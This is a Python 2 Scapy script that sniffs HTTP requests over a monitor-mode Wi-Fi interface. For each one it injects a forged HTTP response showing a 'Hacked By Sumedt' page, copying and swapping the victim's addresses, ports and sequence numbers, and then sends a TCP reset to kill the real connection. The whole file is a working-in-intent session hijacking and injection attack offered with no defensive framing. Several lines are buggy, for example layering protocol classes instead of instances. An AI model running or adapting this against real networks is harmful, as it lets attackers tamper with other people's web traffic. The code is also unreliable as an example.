#!/usr/bin/env python

from scapy.all import *
from scapy.error import Scapy_Exception
import HTTP

##### Start promicuous mode with airmon-ng start wlan0 11 (airmon-ng start/stop interface channel)

m_iface="mon0"

def pktTCP(pkt):
	if pkt.haslayer(TCP):
		if HTTP.HTTPRequest or HTTP.HTTPResponse in pkt:
			src=pkt[IP].src
			srcport=pkt[IP].sport
			dst=pkt[IP].dst
			dstport=pkt[IP].dport
			test=pkt[TCP].payload
			if HTTP.HTTPRequest in pkt:
				print "HTTP Request:"
				print "======================================================================"
				print ("Src: ",src," Sport: ",srcport," Dst: ",dst," Dport: ",dstport," Hostname: ",test.Host)
				print ("Seq: ",str(pkt[TCP].seq)," | Ack: ",str(pkt[TCP].ack))



				#### Spoof HTTP Response
				day=time.strftime("%a, %d %Y %T GMT+7")
				#print day
				spoof_Page="<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\"><html><head><title>Hacked</title></head><body><p>Hacked By Sumedt</font></p></body></html>"
				len_of_page=len(spoof_Page)
				spoof_HTTP_Response_Header="HTTP/1.1 200 OK\x0d\x0aDate: "+day+"\x0d\x0aContent-Type: text/html; charset=UTF-8\x0d\x0aContent-Length: "+str(len_of_page)+"\x0d\x0a\x0d\x0a"
				Spoof_Payload=spoof_HTTP_Response_Header+spoof_Page

				#### Crafing HTTP Response Packet
				spoof_response=(Dot11/Ether/IP/TCP/Spoof_Payload)
				#### Spoof IP
				spoof_response.dst=pkt[IP].src
				spoof_response.src=pkt[IP].dst
				spoof_response.ihl=pkt[IP].ihl
				spoof_response.proto=pkt[IP].proto
				#### Spoof Port, Seq, Ack
				spoof_response.sport=pkt[TCP].dport
				spoof_response.dport=dport=pkt[TCP].sport
				spoof_response.seq=pkt[TCP].ack
				spoof_response.ack=pkt[TCP].seq
				spoof_response.dataofs=pkt[TCP].dataofs
				spoof_response.reserved=pkt[TCP].reserved
				spoof_response.flags="PA",
				spoof_response.window=pkt[TCP].window
				spoof_response.options=pkt[TCP].options

				spoof_response.FCfield = 2L
				spoof_response.addr1=pkt.addr2
				spoof_response.addr2=pkt.addr1
				print "Spoof Detail: "
				print ls(spoof_response)
				send(spoof_response) 

				#### Send RST-FIN
				Bye=TCP(sport=80, dport=pkt[TCP].sport, flags="RA", seq=pkt[TCP].ack, ack=pkt[TCP].seq, options=[('MSS', 1460)])
				ip=IP(src=pkt[IP].dst, dst=pkt[IP].src)
				send(ip/Bye)
	

#			if HTTP.HTTPResponse in pkt:
#				print "HTTP Response Detail:"
#				print "======================================================================"
#				print ls(pkt)
				

sniff(iface=m_iface,prn=pktTCP)
#sniff(filter='tcp',iface=m_iface,prn=pktTCP)

